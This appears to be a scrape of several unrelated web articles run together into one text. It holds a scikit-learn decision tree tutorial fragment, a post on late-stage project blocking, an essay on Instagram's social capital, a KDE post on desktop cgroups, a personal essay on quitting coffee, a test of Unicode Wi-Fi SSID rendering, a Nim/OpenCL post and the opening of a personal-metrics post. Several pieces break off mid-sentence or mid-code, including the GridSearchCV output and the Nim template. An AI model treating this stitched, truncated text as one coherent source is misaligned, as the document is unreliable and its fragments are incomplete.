<p>For that we are going to instantiate the Decision tree classifier and then use the fit method on Train data.</p>

<p>Predict method of decision tree classifier will find the target class for the test data</p>

<p>Finally we will calculate the accuracy on our test data prediction</p>

<div><div><pre><code>from sklearn.metrics import accuracy_score

clf = DecisionTreeClassifier() #Instantiate Decision tree classifier
clf.fit(X_train, y_train)      # Use fit method on the train data

y_pred = clf.predict(X_test)   # Predict the target class of test data
accuracy_score(y_test, y_pred)  # Measure Accuracy
</code></pre></div></div>

<p>Let’s evaluate the cross validation score as well</p>

<div><div><pre><code>from sklearn.model_selection import cross_val_score
scores = cross_val_score(clf, X_test, y_test, cv=5)
print("Accuracy: %0.2f (+/- %0.2f)" % (scores.mean(), scores.std() * 2))
</code></pre></div></div>

<h2 id="visualize-decision-tree-using-plot_tree"><strong>Visualize Decision Tree using plot_tree</strong></h2>

<p>You can also Visualize the final decision tree by using the plot_tree function of the sklearn.</p>

<p>There are other ways to visualize using pydot and graphviz but I’m not going to discuss those methods in this post</p>

<div><div><pre><code>%matplotlib inline
from matplotlib.pyplot import figure
from sklearn.tree import plot_tree
figure(num=None, figsize=(20, 6), dpi=80, facecolor='w', edgecolor='k')
plot_tree(clf.fit(wine_data.data, wine_data.target))
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image.png" alt=""></p>

<h2 id="gridsearchcv"><strong>GridSearchCV</strong></h2>

<p>Hyper parameters selection is an important part for model selection. how would you know what combinations of these parameters will give you the best outcome?</p>

<p>One way is randomly selecting these values and see which combinations of parameters will give best result.</p>

<p>Isn’t that tedious to do? So Grid Search in Scikit-learn exactly does the same thing and helps to find the best estimator</p>

<div><div><pre><code>from sklearn.model_selection import GridSearchCV, cross_val_score
param_grid = {'criterion':['gini','entropy'], 'max_depth' :
[3,5,7,20]}
grid_search = GridSearchCV(clf,param_grid=param_grid,cv=5)
grid_search.fit(X_train, y_train)
</code></pre></div></div>

<p><img src="https://kanoki.org/images/2020/05/image-1.png" alt=""></p>

<p>You can see all the criteria and their respective score that gridsearch used to evaluate the best estimate by accessing the params and mean_test_score of grid search object</p>

<p>The params and the mean_test_score keys will give you the parameters and their corresponding results</p>

<div><div><pre><code>grid_search.cv_results_['params']
grid_search.cv_results_['mean_test_score']
</code></pre></div></div>

<div><div><pre><code>([{'criterion': 'gini', 'max_depth': 3},

  {'criterion': 'gini', 'max_depth': 7},
  {'criterion': 'gini', 'max_depth': 20},

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the most frustrating and common experiences in the workplace is getting work blocked near the finish line. Examples:</p>
<ul>
  <li>A feature is developed over the course of 3 months. In the launch meeting a manager swoops in and declares it can’t be released for security reasons.</li>
  <li>You ask your manager for feedback on a proposal. They don’t respond. You ask again. They give a cursory glance and say “looks good”. A week later you say you’re ready to send it out. Suddenly they flood the document with feedback which ruins your timeline.</li>
  <li>An entire division works on a project for weeks. The minute they make it live the VP of the division storms in and yells “revert!”. The VP is displeased with the styling and insists it can’t be shipped that way.</li>
</ul>

<p>There’s usually one of 3 main causes for this anti-pattern:</p>
<ul>
  <li>Problem 1: Laziness/mis-calculation/ego. The stakeholder thinks it’s more efficient for them to engage with something closer to the finish line than early stage. This is often a gross mis-calculation. Projects are like cruise ships - you want to get to your destination with a lot of little steering along the way, not heroics after things have veered off course.</li>
  <li>Problem 2: Bad process. A critical stakeholder isn’t procedurally involved at the right time. If you find yourself blocking projects regularly, it’s your responsibility to fix this. <a href="https://staysaasy.com/process/2020/04/06/Creating-Good-Process.html">Create good process</a>.</li>
  <li>Problem 3: Micromanagement. The project/proposal didn’t actually need the manager’s feedback, they just can’t help having to put their stamp on everything.</li>
</ul>

<p>The solutions are simple but hard to master:</p>
<ul>
  <li>Answer 1: If you don’t think you need to be involved early, imagine the project goes live without your feedback at all. If you’re comfortable with that, you probably don’t need to be involved early (or at all). If you do need to give feedback, do it early and along the way.</li>
  <li>Answer 2: Make sure you have a process that involves necessary stakeholders at the right time.</li>
  <li>Answer 3: Don’t micromanage.</li>
</ul>

<p>If you mess up and find yourself giving major feedback near the finish line of a project, find ways to say yes and make sure you’re empathizing with the frustration that’s resulting from the late stage changes.</p>



<p>Some people actually take pride in blocking projects. Stakeholders who repeatedly view themselves as “saving the day” when it comes to tanking momentum and releases. They see themselves as a fountain of unique knowledge that prevent disasters.</p>

<p>This is almost always a result of incentives that are grossly mis-aligned. Some organizations have stakeholders who show up late in the game, who are not responsible for other teams being productive, who have 0 incentive to facilitate work and all the incentive to block things.</p>

<p>Companies should incentivize these stakeholders not only for preventing problematic releases, but also for the amount of things teams can get done to their requirements.  This ties their success to both risk management and enablement.</p>

<div>
<p>When it comes to the most popular platforms in the world, the motives behind certain feature roll-outs or a lack of early monetisation often seems to elude logic. Why hasn’t Whatsapp enabled payments sooner and Twitter moved toward monetisation more aggressively? Why did Facebook quietly roll back its influencer platform a few years ago? More recently, I find myself questioning why Instagram waited years to introduce the Checkout function that would have made it an intimidating e-commerce competitor much earlier in the game.&nbsp;</p>



<p>All of these seemingly spotlight decisions fall into a deliberate strategy tied to the lifeblood of these platforms, social capital. The long game is to cultivate social capital, gamify its distribution and eventually convert it into economic capital. Although social capital, in essence, is ephemeral and intangible, society’s collective agreement that it holds value makes it so – much like money. In that sense, Social Media did for social capital what fiat did for economic capital. No longer as difficult to quantify, it has become the world’s mirror economy with value as tangible to an individual as monetary worth. The most explicit manifestation of this has been the rise of the influencer economy, the traditionally unspoken dynamics of social hierarchies and celebrity culture on steroids and now accessible to the masses.&nbsp;</p>



<p>For social media platforms, social capital is the fuel in their engine. Their business is the pursuit of the perpetual growth of collective social capital on their platform. As the platforms reach stages of greater maturity, the conversion funnel reaches its final stages as well – the very stage Instagram is at the beginning of right now as it attempts to complete the loop of social to economic value creation. In essence, this is the fluid direction of influencer recommendations into convertible commercial transactions within the app. But the question remains – could Instagram have implemented this feature successfully years before this point? The science behind this kind of decision is delicate, social capital must be cultivated and morphed in a way that value is not depleted from or ported away from the platform. Flow theory, a psychological concept of the mind’s ideal state of engagement provides a contextual model for how social media platforms like Instagram have achieved this balance.&nbsp;</p>



<h3>Gamifying social capital: creating a state of flow&nbsp;</h3>



<p>Flow theory, a broader psychological theory on how the optimal balance of skill and challenge creates a state of complete immersion is a core focus of gamification as it is applied in gaming itself, but also across various industries. When it comes to social media, platforms have built their networks through the gamification of social capital, building an immersive and engaging game-like experience around the act of accruing social capital – “how many likes did it get?” now a popular criteria for validity. Both gaming and social media tactically withhold and subsequently trigger endorphins to create products that are addictive by nature.&nbsp; A comparison of how flow is cultivated across gaming and social media reveals a lot about the very habits many of us participate in, on a daily basis.&nbsp;</p>



<p><strong>Skill &amp; Challenge</strong></p>



<p><strong>In gaming –</strong> the game must produce a task challenging enough for the player but not so challenging that the player’s skill level is incapable of completing the task</p>



<p><strong>In social media:</strong> building social capital (offline or online) inherently carries a degree of challenge that requires great effort to meet. The challenge is derived from your context (i.e. your friends or others on the platform) who may have larger followings or more liked photos. As a user’s ‘success’ scales, their field of comparison grows with them, and thereby the challenge increases. This is the mechanism by which individuals are incentivised to perpetually grow their own social capital and therefore the platform’s collective capital.&nbsp;</p>



<p><strong>Engagement</strong></p>



<p><strong>In gaming:</strong> the task has to be active and engaging</p>



<p><strong>In social media:</strong> A challenge in itself is not rewarding enough to prompt or incentivise users to continue their accrual of social capital. The natural feedback loop of validation through followers, likes and other features create psychological self-fulfilment. Sometimes there is economic utility to be derived by those who seek to leverage their social capital beyond just validation. Pursuit of this feedback loop keeps the users active and engaged in the activities of the platform.&nbsp;</p>



<p><strong>Reward</strong></p>



<p><strong>In gaming –</strong> the task has to have clear parameters for success. These clear parameters help to enter and maintain a ‘flow state’ as they indicate progress and quality.</p>



<p><strong>In social media:</strong> Success on social media platforms is measured by metrics like number of followers, likes and views. For users reaping economic rewards as well, the utility of their social capital can also be measured in sponsorships, ads and other forms of social media-driven income. While the latter is not as publicly available information, both types can lead to strong signalling of one’s success on social media.&nbsp;</p>



<p><strong>Motivation</strong></p>



<p><strong>In gaming –</strong>&nbsp; the player must be intrinsically motivated to complete the task</p>



<p><strong>In social media: </strong>Where flow theory in gaming requires a complete blueprint of gamification to tap into the intrinsic motivation of players, socialising is a natural state of flow humans have always engaged in. The activity of building social capital is, for the most part, natural and instinctive especially when paired with the platform’s circular feedback loop for validation and reward.</p>



<h3>Making decisions and maintaining flow: the final stages</h3>



<p>Given that social media by its very nature can keep participants engaged without too much intervention, the most important element of gamification becomes the conversion of social capital into economic value. This has to be achieved without drowning the platform in mechanisms which disturb the state of flow already established.&nbsp;&nbsp;</p>



<p>The original set of features introduced by the platform for the accumulation of social capital has a shelf life, after which users will tire of it or reach a point of saturation that skews the effort to return balance necessary for flow. At this point platforms need to extend the avenues of creation, either by innovating existing features or introducing new features. This is the kind of thinking that drives Instagram to introduce ‘stories’ as opposed to just static posts for the feed.</p>



<p>However as the features start compounding, there is an inevitable layering of game theory mechanics which could heavily influence the state of flow. For this reason, the introduction of new features has to avoid detracting from the existing balance of social capital accumulation. If a feature presented a challenge greater than the effort or skill the user was willing to part with – participation and therefore total social capital on the platform would take a hit.&nbsp;&nbsp;&nbsp;</p>



<p>In a similar sense, the introduction of the Instagram Checkout was a thoughtful and timely implementation over many years of incremental introductions that maintained the state of flow for users. Instagram prioritised the maintenance of social capital within its ecosystem, choosing not to risk the pre-emptive roll out of a feature that would deplete social capital or endanger the state of flow it was cultivating.&nbsp;&nbsp;</p>



<p>When users began tapping into off-platform mechanisms to convert their social capital into economic capital as a result of this, Instagram didn’t put up any barriers. Instagram would have seen this as priming its users for a later stage of its own conversion funnel without taking on any of the risk of disturbing its own state of flow. In 2016, when Instagram introduced Shopping tags for feed posts and later the Shopping tab in 2018, features that led to external stores for point of purchase, it was encouraging this behaviour – all the while knowing it would eventually incorporate these tested habits back into its own environment.&nbsp;</p>



<h3>Social to economic capital: a delicate conversion</h3>



<p>Given that maintaining a state of flow is a key decision metric behind the strategies of killer platforms, a nuanced understanding of it better places us to predict how other platforms like Whatsapp and Twitter may navigate this delicate balance moving forward.&nbsp;</p>



<p>With 89% of influencers using Instagram, it ranks as the number one platform for influencer marketing – no better testament to the economic rewards Instagram will reap as it begins cashing in its unparalleled social capital. Whilst we do not have many points of comparison for social media platforms at the scale of Instagram, the social capital it has been able to accrue is an undeniably powerful metric. Instagram in 2019 brought in 20 billion USD in revenue which accounts for more than a quarter of Facebook’s revenue in that year, only projected to grow further from there.&nbsp;</p>



<p>The careful transition of Instagram towards the full conversion funnel ensures its now end to end e-commerce experience is revered as a perfectly convenient segway for users as opposed to an uncomfortable push for higher revenues.&nbsp;</p>

<h3><span>Down the Rabbit Hole</span></h3>
</p>



<h3>1. Reverse network effects and the conundrum of maintaining palatable signal to noise ratios</h3>



<p>Network effects have seen social networks grow to valuations of billions and connect millions of users. It is tempting to believe that these platforms will remain fail-proof in perpetuity. The value created in a network relies on ‘connection, content and clout’.</p>



<p>“Across these three drivers, a network with greater scale provides greater value in the form of:</p>

	<div>
		<p>A desktop environment's sole role is to connect users to their applications. This includes everything from launching apps to actually displaying apps but also managing them and making sure they run fairly. Everyone is familiar the concept of a "Task manager" (like ksysguard), but over time they haven't kept up with the way applications are being developed or the latest developments from Linux.</p>

<h2>Managing running processes</h2>
<p>There used to be a time where one PID == one "application". The kwrite process represents Kwrite, the firefox process represents Firefox, easy. but this has changed. To pick an extreme example:<br>
<strong>Discord in a flatpak is 13 processes!</strong></p>
<p>It basically renders our task manager's process view unusable. All the names are random gibberish, trying to kill the application or setting nice levels becomes a guessing game.  Parent trees can help, but they only get you so far.</p>
<p>It's unusable for me, it's probably unusable for any user and gets in the way of feeling in control of your computer.</p>
<p>We need some metadata.</p>
<h2>Fair resource distribution</h2>
<p>As mentioned above discord in a flatpak is 13 processes. Krita is one process.</p>
<ul>
<li>One will be straining the CPU because it is a highly sophisticated application doing highly complicated graphic operations</li>
<li>One will be straining the CPU because it's written in electron</li>
</ul>
<p>To a kernel scheduler all it would see are 14 opaque processes. It has no knowledge that they are grouped as two different things. It won't be able to come up with something that's fair.</p>
<p>We need some metadata.</p>
<p>(caveat: Obviously most proceses are idling, and I've ignored threads for the purposes of making a point, don't write about it)</p>
<h2>It's hard to map things</h2>
<p>Currently the only metadata of the "application" is on a window.  To show a user friendly name and icon in ksysguard (or any other system monitor) we have to fetch a list of all processes, fetch a list of all windows and perform a mashup. Coming up with arbitrary heuristics for handling parent PIDs which is unstable and messy.</p>
<p>To give some different real world examples:</p>
<ul>
<li>In plasma's task manager we show an audio indicator next to the relevant window, we do this by matching PIDs of what's playing audio to the PID of a window. Easy for the simple case... however as soon as we go multi-process we have to track the parent PID, and each "fix" just alternates between one bug and another.</li>
<li>With PID namespaces apps can't correctly report client PIDs anymore.</li>
<li>We lose information on what "app" we've spawned. We have bug reports where people have two different taskmanager entries for "Firefox" and "Firefox (nightly)" however once the process is spawned that information is lost - the application reports itself as one consistent name and our taskbar gets confused.</li>
</ul>
<p>We need some metadata.</p>

<h2>This is a solved problem!</h2>
<p>A modern sysadmin doesn't deal in processes, but cgroups. The cgroup manager (which will be typically systemd) spawns each service as one cgroup. It uses cgroups to know what's running, the kernel can see what things belong together. </p>
<p>On the desktop flatpaks will spawn themselves in cgroups so that they can use the relevant namespace features.</p>
<p>You're probably already using cgroups. As part of a <a href="https://systemd.io/DESKTOP_ENVIRONMENTS">cross-desktop effort</a> we want to bring cgroups to the entire desktop.</p>
<h2>Example</h2>
<p>Before and after of our system monitor<br>
<a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png" alt=""></a></p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps-1024x772.png" alt=""></a></p>
<p>Ultimately the same data but way easier to read..</p>

<p>Another key part of cgroup usage is the concept of slices. Cgroups are based on a heirachical structure, with slices as logical places to split resource usage. We don't adjust resources globally, we adjust resources within our slice, which then provides information to the scheduler.</p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png" alt=""></a></p>
<p>Conceptually you can imagine that we just adjust resources within our level of a tree. Then the kernel magically takes care of the rest.</p>
<p>More information can be found on slices in this excellent series <a href="https://www.redhat.com/en/blog/world-domination-cgroups-part-2-turning-knobs"> World domination with cgroups</a>.</p>
<h2>Default slices</h2>
<p>This means we can set up some predefined slices. Within the relevant user slice this will consist shared of</p>
<ul>
<li>applications</li>
<li>the system (kwin/mutter, plasmashell)</li>
<li>background services (baloo, tracker)</li>
</ul>
<p>Each of these slices can be given some default prioritisations and OOM settings out of the box.</p>
<h2>Dynamic resource shifting</h2>
<p>Now that we are using slices, and only adjusting our relative weight within the slice, we can shift resource priority to the application owning the focused window.</p>
<p>This only has any effect if your system is running at full steam from mulitple sources at once, but it can provide a slicker response at no drawback.</p>
<h2>Why slice, doesn't nice suffice?</h2>
<p>Nice is a single value, global across the entire system. Because of this user processes can only be lowered, but never raised to avoid messing with the system.  With slices we're only adjusting relative weight compared to services within our slice. So it's safe to give the user full control within their slice. Any adjustments to an application, won't impact system services or other users.</p>
<p>It also doesn't conflict with nice values set by the application explicitly. If we set kdevelop to have greater CPU weight, clang won't suddenly take over the whole computer when compiling.</p>

<h2>CGroup extra features</h2>
<p>CGroup's come with a lot of new features that aren't available on a per-process level. </p>
<p>We can:</p>
<ul>
<li>Set limits so that a CPU can't use more than N% </li>
<li>We can gracefully close processes on logout</li>
<li>We can disable networking</li>
<li>We can set memory limits</li>
<li>We can prevent forkbombs</li>
<li>We can provide hints to the OOM killer not just with a weight but with expected ranges that should be considered normal</li>
<li>We can freeze groups of processes (which will be useful for Plasma mobile)<br>
... </li>
</ul>
<p>All of this is easy to add for a user / system administrator. Using drop in's one can just add a .service file [example file link] to ~/.config/systemd/user.control/app-firefox@.service and manipulate any of these.</p>
<p>[caveat, some of those features works for applications created as new transient services, not the lite version using scopes that's currently merged in KDE/Gnome - maybe worth mentioning]</p>

<p>Plasma 5.19 and recent Gnome now spawn applications into respective cgroups, but we're not yet surfacing the results that we can get from this.</p>
<p>For the KDE devs providing the metadata is easy.</p>
<p>If spawning a new application from an existing application be sure to use either <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1ApplicationLauncherJob.html"><code>ApplicationLauncherJob</code></a> or <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1CommandLauncherJob.html"><code>CommandLauncherJob</code></a> and set the respective service. Everything else is then handled automagically. You should be using these classes anyway for spawning new services.</p>
<p>For users, you can spawn an application with either <code><code>kstart5 --application foo.desktop"</code></code></p>
<p>That change to the launching is relatively tiny, but getting to this point in Plasma wasn't easy - there were a lot of edge cases that messed up the grouping correctly.</p>
<ul>
<li>kinit, our zygote process really meddled with keeping things grouped correctly</li>
<li>drkonqi, our crash handler and application restarter</li>
<li>dbus activation has no knowledge of the associated .desktop file if an application is DBus activated (such as spectacle our screenshot tool)</li>
<li>and many many more papercuts throughout of different launches</li>
</ul>
<p>Also to fully capitalise on slices we need to move all our background processes into managed services and slices. This is worthy of another (equally lengthy) blog post.</p>
<h2>How you can help?</h2>
<p>It's been a battle to find these edge cases.<br>
Whilst running your system, please run systemd-cgls and point out any applications (not background services yet) that are not in their appropriate cgroup.</p>

<p>(e.g BSD users)</p>
<p>As we're just adding metadata, everything used now will continue to work exactly as it does now. All existing tools work exactly the same. Within our task manager we still will keep a process view (it's still useful regardless) and we won't put in any code that relies on the cgroup metadata present. We'll keep the existing heuristics for matching windows with external events, cgroup metadata would just be a strongly influence factor in that. Things won't get worse, but we won't be able to capitalise on the new features discussed here, </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" role="main"> <article role="article">  <p>I never identified as a coffee snob or someone with a serious habit – like everyone else, I made lots of self-deprecating jokes about how much coffee I drank – until one day I realized that I had been drinking more coffee than anyone else I knew for the past fifteen years.</p> <p>I started drinking coffee in high school. I would stay up all night competitively playing video games, and then head to school on two or three hours of sleep. If I tried to attend class, I would immediately pass out on my desk. There was a coffee machine in the cafeteria, where I would solve that problem by purchasing a cup of scalding-hot black coffee for fifty cents. It was shitty coffee, and I hated the flavor. But I needed it, and took the bitterness as fair punishment for not sleeping. That cup got me wired – the caffeine rush would electrify my body, and my hand would shake erratic, two-inch tall letters out of my Pilot V5.</p> <p>Two hours later, I’d get another cup, and that would last me into the early afternoon. I’d crash and fall asleep in class at 1:50pm, like clockwork. I’d get another cup at 2:00pm between classes, to carry me through the rest of the day. When I took my finals before graduating, the principal sent out a grade-wide complaint that too many coffee cups got littered outside the exam rooms. They were all mine. My #1 concern in high school was dying of a heart attack due to my completely insane sleep and caffeine habits.</p> <p>Somehow I survived high school. My sleep patterns would, over the course of the years, very slowly approach those of a normal person, but coffee stuck. I would drink it to help stay up late, or to wake me up after a short night. When things got really urgent I’d supplement with some Red Bull. My tastes advanced a little bit: I quit the punitive straight black coffee, and experimented with extravagances like sugar and milk. As I started to work internships near Starbuckses, I would get vanilla-hazelnut lattes, and my coffee runs were known for their consistency and punctuality.</p> <p>After college and graduate school, things kicked up a notch. Lots of people define their persona by their love of coffee, and I chose to be one of those. I drank coffee – lattes, in particular – religiously. My first business card’s title read <em>Caffeine Fiend</em>.<sup id="fnref:1"><a href="#fn:1">1</a></sup> I systematically sampled nearly every single cafe in San Francisco. Weirdly, I knew I didn’t really love lattes. I liked them, but a latte can ultimately only be so good. They were a habit, something I’d been doing for a long time, and had made part of my persona.<sup id="fnref:2"><a href="#fn:2">2</a></sup> Besides, I needed the kick. I realized that coffee was useful in technical, creative work not because it increases wakefulness, but because it increases <em>focus</em>. I had a latte machine in the office and a company to build, so at some point I hit ten cups a day.</p> <p>Enter March 2020. I had moved offices – no more free coffee – and was spending more on cinnamon lattes than some people spend on their mortgage. I was more cautious than most about COVID-19, and started isolating myself in early March. Being a coffee addict but not a true aficionado, I did not own anything in the way of a coffee machine. (I have never made much use of my kitchen.) I had no way to make coffee at home, and due to COVID I wasn’t in the mood to go out shopping. Almost four months later, I still haven’t had any coffee.</p> <p>Losing coffee was unpleasant at first. Abandoning a ritual can make the rest of the day feel weirdly incomplete. But I soon stopped missing or thinking about it. My quality of life had improved. With coffee, the regular motions of the day become exaggerated – there would be spikes of focus and the feeling of productivity<sup id="fnref:3"><a href="#fn:3">3</a></sup>, but there would also be caffeine crashes every four hours. The days that I used caffeine to push myself too far would invariably end in long headaches. I often felt very seriously drained at the end of the workday, and couldn’t do anything in the evening.</p> <p>The last four months, without coffee, have been much better. No headaches. No crashes. Consequently – and ironically – I’m now probably <em>more awake</em> on average throughout the day. I’ve been very surprised by how little I actually needed the caffeine, even in the morning after a short night. Thus, I’m not sure how much value caffeine actually provided me over the past few working years. I had so much of it that the beneficial effects certainly wore off (I would even drink coffee right before going to sleep). However, the downsides of coffee – trading in later energy to have more focus now, the drain and crash later in the day – never wore off.</p> <p>Ultimately, as COVID wraps up and things go back to normal, I don’t feel the need to pick up coffee again. Maybe I’ll try decaf for the pleasure of an evening latte, but I’m happy to kick the habit.</p> <hr>  <br> </article> </div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>After my recent post <a href="https://hamptonmoore.com/posts/fios-home-router-emoji/">Setting the SSID of a Fios Home Router to an emoji</a> I decided to set my WiFis SSID to “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”. That name is <a href="https://mothereff.in/byte-counter#a%CC%B6%CC%81%CC%93%CC%BF%CC%88%CC%9B%CC%9B%CD%90%CD%98%CD%86%CC%90%CD%9D%CC%87%CC%92%CC%91%CD%84aaa">36 octets</a> making it over the 32 octets maxium specified in the 2012 standard of 802.11 Section 6.3.11.2.2. My router just cut the name down to 32 octets though to stay complient. This was what was being sent according to <code>iw</code> <code>a\xcc\xb6\xcc\x81\xcc\x93\xcc\xbf\xcc\x88\xcc\x9b\xcc\x9b\xcd\x90\xcd\x98\xcd\x86\xcc\x90\xcd\x9d\xcc\x87\xcc\x92\xcc\x91\xcd</code> with the raw hex being <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>.</p> <p>I decided to see how this showed up on different devices and got some pretty strange results. Below are the devices tested sorted rougly to how they acted.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p>Both the s8 and the Firestick are rendering the result in what I deem as the correct way with it showing the name just with some of the vertical characters cutoff.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""></p> <p>Next comes the iPhone and Apple TV. At first I had no idea what they were rending these characters as. At first I thought it was just extended ascii but that third character, ∂, was not in extended ASCII. After asking around on the Apple discord server someone said it might be using the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set. It turns out it which is strange because iOS used UTF-8 internally and not Mac OS Roman as that was phased out with the release of Mac OS X.</p> <p>Speaking of Apple devices, there will not be any photos of MacOS though not from a lack of trying. I could not get either of my Macbook to acknowledge that this WiFi network existed. Neither the Wifi dropdown nor the airport commandline utility would show it.</p> <p>Windows 10 Pro 10.0.19041 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/windows10.png" alt=""></p> <p><del>Windows 10 is rendering it using what I believe to be the UTF-8 characters of each octet. This matches what the raw hex of the wifi name would become if you split it up into 8bit bytes and used that as UTF-8 chars.</del> It was pointed out by <a href="https://twitter.com/theFerdi265">@theFerdi265</a> that this is not the first set of UTF-8 chars like I thought. Instead it is <a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252</a>, a single-byte character encoding of the Latin alphabet, used by default in the legacy components of Microsoft Windows for English and some other European languages.</p> <p>Chromebook running ChromeOS 83.0.4103.97 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/chromeos.jpg" alt=""></p> <p>ChromeOS is just freaking out not knowing how to render any of the charaters besides the singular a.</p> <p>Kindle Paperwhite running Firmware 5.10.2 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/kindlepaperwhite.jpg" alt=""></p> <p>Vizio M55-C2 TV <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/viziom55-c2.jpg" alt=""></p> <p>Both the Kindle and Vizio TV are showing what <code>iw</code> returned with the a and then escaped hexademical characters.</p> <p>I have no published a follow up to this post, <a href="https://hamptonmoore.com/posts/weird-wifi-names-cont/">here</a>.</p> <p>Discuss this post on Hacker News <a href="https://news.ycombinator.com/item?id=23708056">here</a></p> <hr> <p> Hello reader.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="documentId">
  <div>
    
    <p><em>Date: May 6, 2018, by Mamy André-Ratsimbazafy</em></p>
<p>Arraymancer is a tensor library I’m writing from the ground up in Nim. Cuda support was added in v0.3 last December, I just released the new v0.4 with OpenCL support.</p>
<p>I’d like to share a bit of my experience on working in OpenCL through Nim. First of all, you have to know that none of the big guys (Google Tensorflow, Facebook PyTorch, Apache/Amazon MxNet, Microsoft CNTK or even Intel/AMD) has first class OpenCL support.</p>
<p>Why? Probably because Nvidia is providing superb tools and documentation for frameworks developers. Also Cuda can leerage a few C++ facilities like generics and function objects that I use heavily for generic code.</p>
<p>For example in Nim+Cuda I define element-wise functions like the following and pass it to a higher-order function that will apply it element-wise on 3 tensors:</p>
<pre>

<span>template</span> <span>cuda_binary_op</span><span>(</span><span>op_name</span><span>,</span> <span>op_symbol</span><span>:</span> <span>string</span><span>)</span><span>=</span>
  <span>{</span><span>.</span><span>emit</span><span>:</span><span>[</span><span>"""
  template&lt;typename T&gt;
  struct """</span><span>,</span><span>op_name</span><span>,</span><span>"""{
  __device__ __forceinline__ void operator()(
      T *  __restrict__ dst,
      const T *  __restrict__ A,
      const T *  __restrict__ B){
      *dst = __ldg(A)"""</span><span>,</span> <span>op_symbol</span><span>,</span> <span>""" __ldg(B);
      }
  };
  """</span><span>]</span><span>.</span><span>}</span></pre><p>You can see here the advantage of C++: <tt><span>typename T</span></tt> to template over int/float/double and higher-order functions/function object for cleaner code. You can also see that Nim can directly inline C++ code with <tt><span>emit</span></tt> and I even templatize the operation_name.</p>
<p>Now what about OpenCL? Unfortunately C doesn’t offer something similar and requires a lot of boilerplate. The alternative, the C++ official OpenCL API and implementation: SYCL is very experimental and I am not sure how it works on actual GPUs.</p>
<p>However thanks to Nim metaprogramming, squashing the C boilerplate is super easy. Here is an example kernel to do C = A op B</p>
<pre><span>template</span> <span>gen_cl_apply3</span><span>*</span><span>(</span><span>kern_name</span><span>,</span> <span>ctype</span><span>,</span> <span>op</span><span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span> <span>=</span>

<p>After using Nim + OpenCL, I actually realized that using C++ function objects was overengineering.</p>
<p>To conclude, at the moment, I am convinced that the best language to work with GPUs is Nim.</p>
<p>Oh, and for those who wants to see real Nim code for neural networks, here is a Fizzbuzz in Nim using neural networks (I didn’t implement it on GPU yet though)</p>

    <h4>TL;DR: By documenting key metrics, I came to better understand the consequences of my actions. I also gained an appreciation for the power of habits and persistence.</h4>
<figure><img src="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics.png" alt="" srcset="http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics.png 1200w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-500x500.png 500w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-1024x1024.png 1024w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-150x150.png 150w, http://www.erickarjaluoto.com/wp-content/uploads/2020/03/metrics-768x768.png 768w" sizes="(max-width: 1200px) 100vw, 1200px"></figure>
<p><em>“Commit to documenting it—no matter what.”</em> That’s the deal I made with myself in late 2018. I agreed that I’d collect the data—be it good or bad. Equally important: I made no commitment to take any other action. I figured that by keeping this simple, I had little excuse to not stick with it. Soon, it also spurred action.</p>
<h2>The tools</h2>
<p>You can collect personal metrics with many tools. The following are the ones I use.</p>
<ul>
<li>Calorie counting on iOS and web app: myfitnesspal </li>
<li>Physical data (heart rate, activity, sleep): Garmin Fenix 5X</li>
<li>Weight, body fat, BMI: Fitbit Aria</li>
<li>Metrics documentation: Numbers spreadsheet </li>
</ul>
<p>These tools aren’t perfect, but they aren’t bad, either. Myfitnesspal contains a lot of inaccurate calorie counts. This requires me to compare items/sources. Wrist-based heart rate tracking also isn’t super-accurate. That said, it’s more convenient than pairing with a chest strap.</p>
<p>Data-syncing can be clumsy. For example, my scale doesn’t talk to Garmin Connect. Still, I want accurate weight data in there for calculating exertion. So, I manually insert my weight into Garmin Connect, each morning.</p>
<p>I also started collecting all my data in Google Sheets. Displaying this data got sluggish, though. This led me to switch to Numbers, which I find snappier.</p>
<p>I also created some workflows in Alfred to speed up the process. Now, I type “gar” into Alfred to rapidly open Garmin Connect for pulling data. I do the same with myfitnesspal, Stripe, and Google Analytics. (I know I could import this data automatically, but have my reasons for not doing so. I’ll get to these in a moment.)</p>
<h2>What I measure</h2>
<p>Since starting I’ve changed which metrics I collect. For the most part, though, they sort into a few key groupings. These are:</p>
<ul>
